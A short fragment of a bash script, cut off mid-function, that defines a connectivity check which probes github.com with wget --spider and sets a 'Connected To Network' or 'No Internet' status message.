# Check if offline
net() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" = 0 ]; then

	    nN='Y'
	    NnEt="Connected To Network [★]"

	break
       else
		nN='N'
		NnEt="No Internet [X] "
		break
